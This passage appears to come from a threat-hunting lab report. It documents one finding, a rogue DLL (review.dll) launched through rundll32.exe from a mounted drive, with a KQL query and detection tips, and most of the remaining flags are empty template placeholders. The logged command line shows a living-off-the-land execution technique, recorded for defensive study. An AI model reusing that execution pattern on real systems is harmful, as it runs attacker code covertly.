Enable auditing of process creation with user context and alert on suspicious executions (e.g., `rundll32.exe` loading DLLs from non-standard paths) tied to specific user accounts. Monitor for unusual activity originating from user endpoints, especially involving mounted drives or external media.

**Hunting Tip:**  
Pivot on the `User` field in process creation logs to identify the first user associated with malicious activity. Trace all subsequent actions tied to that account to understand the full attack path and potential lateral movement.

</details>

---

<details>
<summary id="-flag-13">🚩 <strong>Flag 13: <Technique Name></strong></summary>

### 🎯 Objective
Execute a malicious payload by leveraging a trusted Windows utility (`rundll32.exe`) to load and run a rogue DLL (`review.dll`), likely for stealthy code execution and potential persistence or follow-on actions.

### 📌 Finding
A suspicious DLL (`review.dll`) was executed via `rundll32.exe`, a legitimate Windows binary commonly abused for proxy execution. The process was initiated from a user-driven parent process, indicating initial user interaction (patient zero) leading to execution.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Affected Host - e.g., WIN-XXXX> |
| Timestamp | <Execution Time from Event Logs> |
| Process | rundll32.exe |
| Parent Process | explorer.exe |
| Command Line | "C:\Windows\System32\rundll32.exe" D:\review.dll,StartW |

### 💡 Why it matters
This activity reflects **Living Off the Land (LOLBins)** behavior, where attackers abuse legitimate system binaries to evade detection. `rundll32.exe` is trusted and often bypasses traditional security controls, making it an effective tool for executing malicious DLLs.  

The presence of a DLL executed from a non-standard directory (`D:\`) is highly suspicious and suggests:  
- Initial compromise via user interaction (e.g., download, USB, or phishing)  
- Potential execution of arbitrary attacker-controlled code  
- Increased risk of persistence, lateral movement, or data exfiltration  


### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:27:00) .. datetime(2026-01-30 21:27:10))
| where Computer == "EC2AMAZ-B9GHHO6.emberforge.local"
| where CommandLine_s contains "rundll32.exe"
| where CommandLine_s contains "review.dll"
| project UtcTime_s, Computer, CommandLine_s, User_s

### 🖼️ Screenshot
<img width="992" height="58" alt="image" src="https://github.com/user-attachments/assets/0cb8f698-9588-44a0-8bd3-c2dcd13f1006" />

### 🛠️ Detection Recommendation
Identify and alert on abuse of legitimate Windows binaries (like rundll32.exe) executing suspicious or non-standard payloads.

**Hunting Tip:**  
Search for anomalous `rundll32.exe` executions, especially:  
- DLLs executed from non-system paths (e.g., `D:\`, `Downloads`, `Temp`)  
- Uncommon or non-standard exported functions (e.g., `StartW`)  
- Parent-child chains involving `explorer.exe` → `rundll32.exe`  

</details>

---

<details>
<summary id="-flag-14">🚩 <strong>Flag 14: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-15">🚩 <strong>Flag 15: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-16">🚩 <strong>Flag 16: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-17">🚩 <strong>Flag 17: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-18">🚩 <strong>Flag 18: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-19">🚩 <strong>Flag 19: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-20">🚩 <strong>Flag 20: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-21">🚩 <strong>Flag 21: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-22">🚩 <strong>Flag 22: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-23">🚩 <strong>Flag 23: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-24">🚩 <strong>Flag 24: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-25">🚩 <strong>Flag 25: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-26">🚩 <strong>Flag 26: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-27">🚩 <strong>Flag 27: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-28">🚩 <strong>Flag 28: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-29">🚩 <strong>Flag 29: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-30">🚩 <strong>Flag 30: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-31">🚩 <strong>Flag 31: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-32">🚩 <strong>Flag 32: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-33">🚩 <strong>Flag 33: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-34">🚩 <strong>Flag 34: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-35">🚩 <strong>Flag 35: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-36">🚩 <strong>Flag 36: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-37">🚩 <strong>Flag 37: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-38">🚩 <strong>Flag 38: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-39">🚩 <strong>Flag 39: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-40">🚩 <strong>Flag 40: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-41">🚩 <strong>Flag 41: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-42">🚩 <strong>Flag 42: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-43">🚩 <strong>Flag 43: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-44">🚩 <strong>Flag 44: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-45">🚩 <strong>Flag 45: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- <Placeholder>
- <Placeholder>
- <Placeholder>

### Recommendations
- <Placeholder>
- <Placeholder>
- <Placeholder>

---

## 🧾 Final Assessment

<Concise executive-style conclusion summarizing risk, attacker sophistication, and defensive posture.>

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review  
- Evidence reproducible via advanced hunting  
- Techniques mapped directly to MITRE ATT&CK  

---
